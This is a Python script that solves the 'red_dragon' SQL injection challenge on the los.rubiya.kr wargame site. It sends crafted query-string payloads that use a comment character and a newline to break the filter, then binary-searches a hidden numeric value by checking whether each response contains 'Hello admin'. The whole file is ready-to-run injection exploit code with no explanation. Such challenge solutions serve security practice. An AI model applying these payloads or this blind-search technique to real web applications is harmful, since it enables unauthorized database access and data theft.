import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php'
headers = {'Cookie': ''}
number1 = 100000000
number2 = 1000000000

def searching(num1,num2):
    flag=(num1+num2)/2
    payload1 = "?id='||no>%23&no=%0a{}".format(num1)
    payload2 = "?id='||no<%23&no=%0a{}".format(num2)
    payload3 = "?id='||no>%23&no=%0a{}".format(flag)
    payload4 = "?id='||no<%23&no=%0a{}".format(flag)
    res1 = sess.get(url=URL + payload1, headers=headers, verify=False)
    res2 = sess.get(url=URL + payload2, headers=headers, verify=False)
    res3 = sess.get(url=URL + payload3, headers=headers, verify=False)
    res4 = sess.get(url=URL + payload4, headers=headers, verify=False)
    if 'Hello admin' in res1.text and "Hello admin" in res4.text:
        print(flag)
        searching(num1, flag)

    elif "Hello admin" in res2.text and "Hello admin" in res3.text:
        print(flag)
        searching(flag, num2)

searching(number1,number2)
